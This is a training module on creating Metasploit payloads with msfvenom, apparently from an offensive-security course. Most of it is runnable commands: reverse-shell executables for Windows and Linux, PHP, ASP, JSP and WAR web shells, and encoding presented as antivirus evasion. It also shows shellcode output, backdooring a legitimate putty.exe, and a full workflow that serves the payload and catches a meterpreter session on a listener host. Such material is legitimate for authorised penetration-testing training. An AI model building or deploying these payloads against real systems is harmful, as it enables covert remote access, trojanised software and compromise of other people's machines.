# Module 12 — Payload Creation with msfvenom (1)

> 🔴 **Advanced Level** | Create custom, encoded payloads for any platform
> 

---

# 🧨 Payload Creation with msfvenom

## 🤔 What is msfvenom?

**msfvenom** is the standalone Metasploit payload generator and encoder. It combines the old `msfpayload` and `msfencode` tools into one.

Use msfvenom when you need to:

- Create a standalone executable payload
- Generate shellcode for exploitation
- Encode payloads to evade antivirus
- Create payloads for specific platforms

---

## 📜 Basic msfvenom Syntax

```bash
msfvenom -p PAYLOAD [OPTIONS] -f FORMAT -o OUTPUT_FILE

# Key flags:
# -p PAYLOAD       Payload to use
# -f FORMAT        Output format (exe, elf, raw, python, etc.)
# -o FILE          Output file
# -e ENCODER       Encoder to use
# -i COUNT         Number of encoding iterations
# -b CHARS         Bad characters to avoid
# LHOST=IP         Your listener IP
# LPORT=PORT       Your listener port
# -l payloads      List all payloads
# -l formats       List all output formats
# -l encoders      List all encoders
```

---

## 🚀 Windows Payload Examples

```bash
# Standard Windows reverse shell executable:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f exe \
  -o /tmp/shell_x64.exe

# 32-bit Windows:
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f exe \
  -o /tmp/shell_x86.exe

# HTTPS payload (more stable, encrypted):
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.10 \
  LPORT=443 \
  -f exe \
  -o /tmp/shell_https.exe

# DLL payload:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f dll \
  -o /tmp/payload.dll

# PowerShell payload:
msfvenom -p windows/x64/powershell_reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f psh \
  -o /tmp/shell.ps1

# HTA (HTML Application):
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f hta-psh \
  -o /tmp/shell.hta
```

---

## 🚀 Linux Payload Examples

```bash
# Linux reverse shell (ELF binary):
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f elf \
  -o /tmp/shell_linux

# Make executable:
chmod +x /tmp/shell_linux

# Linux 32-bit:
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f elf \
  -o /tmp/shell_x86
```

---

## 🚀 Web Payload Examples

```bash
# PHP reverse shell (for web servers):
msfvenom -p php/meterpreter_reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f raw \
  -o /tmp/shell.php

# ASP reverse shell (for IIS servers):
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f asp \
  -o /tmp/shell.asp

# ASPX (ASP.NET):
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f aspx \
  -o /tmp/shell.aspx

# JSP (Java servers):
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f raw \
  -o /tmp/shell.jsp

# WAR (Tomcat):
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f war \
  -o /tmp/shell.war
```

---

## 🛡️ Encoding Payloads (Basic AV Evasion)

```bash
# Encode with shikata_ga_nai (most common encoder):
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 10 \
  -f exe \
  -o /tmp/encoded_shell.exe

# -i 10 = encode 10 times (more iterations = more obfuscation)

# List all encoders:
msfvenom -l encoders

# Common encoders:
# x86/shikata_ga_nai    - Polymorphic XOR additive (most effective)
# x64/xor_dynamic       - 64-bit XOR
# x86/countdown         - Countdown XOR
# cmd/powershell_base64 - Base64 encode for PowerShell
```

---

## 📞 Generating Shellcode

```bash
# Generate raw shellcode (for embedding in exploits):
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \
  LPORT=4444 \
  -f c

# Output (C format):
# unsigned char buf[] =
# "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00..."

# Python format:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 -f python

# Raw:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 -f raw > shellcode.bin
```

---

## 🎯 Full Workflow: Create, Deliver, Catch

```bash
# STEP 1: Create payload:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 LPORT=4444 -f exe -o /tmp/payload.exe

# STEP 2: Serve payload (simple HTTP server):
cd /tmp && python3 -m http.server 8080
# Target downloads: http://192.168.1.10:8080/payload.exe

# STEP 3: Set up listener:
msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.10
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j

# STEP 4: Target runs payload.exe
# STEP 5: Session opens automatically:
# [*] Meterpreter session 1 opened
msf6 > sessions -i 1
meterpreter > sysinfo
```

---

> ✅ **msfvenom mastered! Now learn exploit automation.**
> 

---

## Enhancement — Full msfvenom Reference (added — cross-linked with the Shells, Payloads & msfvenom course Modules 08/09/12 for exhaustive flag tables)

### Core Command Structure

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
```

`LHOST=`/`LPORT=` are payload options (no `-` prefix), not msfvenom flags — check a payload's specific options with `msfvenom -p <payload> --list-options`.

### Executable vs Transform Formats

**Executable** (`exe`, `elf`, `macho`, `msi`, `apk`, `war`) — standalone binaries the target OS runs directly, for file-drop delivery.
**Transform** (`raw`, `c`, `csharp`, `python`, `powershell`, `hex`, `base64`) — code/data you embed into another tool, script, or exploit.

### Staged vs Stageless Trade-offs

| Factor | Stageless (`_`) | Staged (`/`) |
| --- | --- | --- |
| File size | Larger — full payload included | Smaller — only stager |
| Reliability | Connects once, no second download to fail | Needs sustained connection for stage transfer |
| Typical use | Standalone msfvenom files (USB drop, upload, SSH transfer) | Default for msfconsole exploit modules |

Most msfvenom standalone files use **stageless** for reliability/self-containment; most msfconsole exploits default to **staged** because the exploit module manages staging automatically.

### Template Injection (-x / -k)

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -x putty.exe -k -f exe -o putty_backdoor.exe
```

`-x` injects the payload into an existing binary; `-k` preserves the original app's behaviour (payload runs in a separate thread). **Detection trade-offs:** file hash mismatch, broken digital signature ("publisher could not be verified"), and AV heuristics specifically targeting the legitimate-binary-plus-injected-section pattern — this technique needs additional obfuscation to be practical against defended networks.

### Encoding — What It Actually Does

`-e x86/shikata_ga_nai -i 3` XOR-encrypts with a changing key + decoder stub. **Legitimate uses only:** bad-character removal (null bytes/newlines breaking a string-copy-based overflow) and character-set format compliance. **Not AV evasion** against modern EDR — heuristic analysis, sandboxing, AMSI, and ML models catch the decoder-stub pattern regardless of iteration count. This connects to the Tool Discipline module in the Exploitation & Weaponisation course — the broader principle of not over-relying on any single tool feature as a silver bullet.